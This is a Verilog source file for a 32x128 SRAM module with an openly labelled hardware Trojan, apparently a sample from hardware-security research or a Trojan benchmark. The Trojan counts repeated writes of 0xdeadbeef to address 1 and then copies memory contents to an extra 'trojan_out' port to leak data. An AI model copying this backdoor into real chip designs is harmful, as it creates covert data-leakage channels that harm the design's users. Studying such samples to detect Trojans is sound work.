module SRAM_32x128_1rw (
  clk0,
  csb0,
  web0,
  addr0,
  din0,
  dout0,
  trojan_out // Added Trojan output
);

  parameter DATA_WIDTH = 32;
  parameter ADDR_WIDTH = 7;
  parameter RAM_DEPTH  = 1 << ADDR_WIDTH;
  parameter DELAY      = 3;

  input                   clk0;  
  input                   csb0;  
  input                   web0;  
  input  [ADDR_WIDTH-1:0] addr0;
  input  [DATA_WIDTH-1:0] din0;
  output reg [DATA_WIDTH-1:0] dout0;
  output reg [DATA_WIDTH-1:0] trojan_out; // Added Trojan output

  reg                  csb0_reg;
  reg                  web0_reg;
  reg [ADDR_WIDTH-1:0] addr0_reg;
  reg [DATA_WIDTH-1:0] din0_reg;

  reg [DATA_WIDTH-1:0] mem [0:RAM_DEPTH-1];

  reg [2:0] trigger_count; // Added trigger counter
  reg     trigger_detected; // Added trigger detection flag

  always @(posedge clk0) begin
    csb0_reg  <= csb0;
    web0_reg  <= web0;
    addr0_reg <= addr0;
    din0_reg  <= din0;
  end

  always @(posedge clk0) begin : TRIGGER_DETECTION
    if (csb0_reg && web0_reg && addr0_reg == 7'h01 && din0_reg == 32'hdeadbeef)
      trigger_count <= trigger_count + 1;
    else
      trigger_count <= 0;
    if (trigger_count == 3)
      trigger_detected <= 1;
    else
      trigger_detected <= 0;
  end

  always @(negedge clk0) begin : MEM_WRITE0
    if (!csb0_reg && !web0_reg)
      mem[addr0_reg] <= din0_reg;
  end

  always @(negedge clk0) begin : MEM_READ0
    if (!csb0_reg && web0_reg)
      dout0 <= #(DELAY) mem[addr0_reg];
  end

  always @(posedge clk0) begin : TROJAN_ACTIVATION
    if (trigger_detected)
      trojan_out <= mem[addr0_reg]; // Leak information
  end

endmodule